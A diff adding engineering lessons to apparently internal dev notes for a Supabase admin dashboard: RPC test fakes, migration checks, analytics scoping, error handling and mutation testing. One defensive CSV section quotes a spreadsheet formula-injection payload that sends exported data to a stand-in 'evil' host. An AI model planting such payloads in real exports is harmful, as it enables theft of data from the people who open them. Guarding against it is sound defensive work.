@@ -195,3 +195,45 @@ past your branch point. `git worktree` shares refs, so a sibling's `git fetch` u
 `origin/<base>` too. Before opening the PR: `git fetch && git rebase origin/feature/admin-dashboard-v1`,
 then re-run the FULL gate (a shared file like `e2e/mock-supabase.mjs` can merge cleanly by text yet
 collide at runtime — see the dispatcher gotcha above).
+
+## `lib/testing/supabase-fake.ts` had no `.rpc()` — any RPC-backed route ticket must add it (ENG-275)
+The fake only modelled `from()/auth/functions/storage`, so the first ticket to call `sb.rpc(...)` (ENG-275
+analytics) couldn't unit-test at all. Extended additively: `FakeState.rpcs: Record<string,{data?,error?}>`,
+`calls.rpc: {name,args}[]`, and an `rpc()` method on `makeFakeClient`. **Caveat:** an *unregistered* rpc name
+returns `{data: [], error: null}`, so a test asserting only "we passed `p_since: null`" would still pass with a
+WRONG function or argument name — it only proves what the client sent. Pin the mapping with a `toEqual` on the
+full response shape, and smoke-test RPC names against a real DB before merge.
+
+## Route tickets consuming another repo's RPCs: read the MERGED migration, don't infer
+ENG-275's contract depended on 9 RPCs from ENG-273 in `stablepass-be`. The local `stablepass-be` checkout's
+`supabase/migrations/` does NOT show them (they were on `feature/analytics-v1`, not main). Do-this:
+`git -C ../stablepass-be fetch origin && git show origin/feature/<epic>:supabase/migrations/<file>.sql` and read
+the `returns table (...)` blocks for the exact column names. Reviewers flagged the RPC layer "UNVERIFIED" because
+they only see this repo — pre-empt it by quoting the migration evidence in the PR.
+
+## `count`-style analytics fields need a real per-row scope or they're a global constant
+ENG-275 first computed a post's `reach` as "all `trial|active` subscriptions" — identical for every post, making
+`opens/reach` meaningless. The right source is the admin-readable `follow` table
+(`follow(user_id, trainer_id, horse_id)`, `follow_no_duplicate unique(user_id,trainer_id,horse_id)` so a count is
+already distinct-by-user, policy `follow_select_admin`): `reach = count(follow where horse_id = post.horse_id)`.
+Check for a `follow`/join table before falling back to a global count.
+
+## Table reads that ignore `error` turn an RLS regression into "no data"
+`const rows = res.data ?? []` on an admin read renders a permission denial as a legitimately-empty list, and
+`if (!data) return null` turns a failed query into a 404. Both hide a broken policy. Use an
+`unwrap(res, what)` that throws on `res.error` for EVERY table read, and keep the genuine not-found branch after
+it. Then catch at the route and return `fail("query_failed", "<generic>", 500)` — never `e.message`, which would
+leak Postgres schema/SQL text to the client.
+
+## Any CSV export of member-supplied text needs a formula-injection guard
+RFC4180 quoting is NOT a mitigation: Excel/Sheets strip the quotes then evaluate a leading `=`, `+`, `-`, `@`,
+tab or CR. A member-supplied `name` of `=HYPERLINK("http://evil"&A1,"x")` exfiltrates the export on one click.
+Prefix any such cell with an apostrophe *before* applying the quoting rules (see `lib/analytics/csv.ts`).
+
+## Mutation-test the analytics mappers — `toMatchObject` and fixture-shaped tests hide real gaps
+On ENG-275 three behaviours survived mutation with a green suite: all `Number()` coercion deleted, the
+array-shaped PostgREST embed branch stubbed to `null`, and `daysLeft` hardcoded to `-999`. Causes: fixtures used
+JS numbers (never exercising the string-bigint path PostgREST can return), the array-embed fixture asserted only
+the CSV header row, and `daysLeft` was never asserted. Use `toEqual` (not `toMatchObject`) on any PII payload so
+a new leaked field fails, and assert derived fields explicitly including the edge case (an expired trial must be
+`0`, not negative).
